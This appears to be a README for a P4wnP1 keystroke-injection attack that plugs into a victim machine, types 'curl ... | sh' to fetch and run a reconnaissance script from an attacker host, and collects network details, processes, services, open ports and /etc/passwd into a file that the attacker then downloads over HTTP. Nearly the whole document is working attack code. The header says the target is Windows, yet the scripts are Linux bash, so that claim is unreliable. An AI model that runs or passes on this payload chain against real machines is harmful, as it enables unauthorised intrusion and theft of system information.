# SYSTEM INFO GRAB
This script has been written in javascript adapted to P4wnP1 language in order to be ran in a Windows desktop environment

# Script
### Javascript
```js
layout('es');
typingSpeed(10)

press("CONTROL ALT t")
type("curl -s http://172.16.0.1:8888/recon.sh | sh")
press("ENTER")
press("ALT TAB")
```
### Recon.sh
```sh
#!/bin/bash

FILE="/tmp/all.txt"

touch $FILE

echo "########## IP's" >> $FILE
ip a >> $FILE
echo "" >> $FILE

echo "########## PROCESSES" >> $FILE
ps aux >> $FILE
echo "" >> $FILE

echo "########## INTERFACES" >> $FILE
netstat --interfaces >> $FILE
echo "" >> $FILE

echo "########## ROUTES" >> $FILE
netstat --route >> $FILE
echo "" >> $FILE

echo "########## SERVICES" >> $FILE
service --status-all >> $FILE
echo "" >> $FILE

echo "########## USERS" >> $FILE
cat /etc/passwd | sort >> $FILE
echo "" >> $FILE

echo "########## PORTS" >> $FILE
for port in $(cat /proc/net/tcp | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do
    echo "[$port] -> $(echo "ibase=16; $port" | bc)" >> $FILE
done
echo "" >> $FILE

timeout 6 python3 -m http.server 8123 --directory /tmp

rm /tmp/all.txt
```

### Send_receive.sh
```sh
#!/bin/bash

timeout 6 python3 -m http.server 8888

wget http://172.16.0.2:8123/all.txt
```
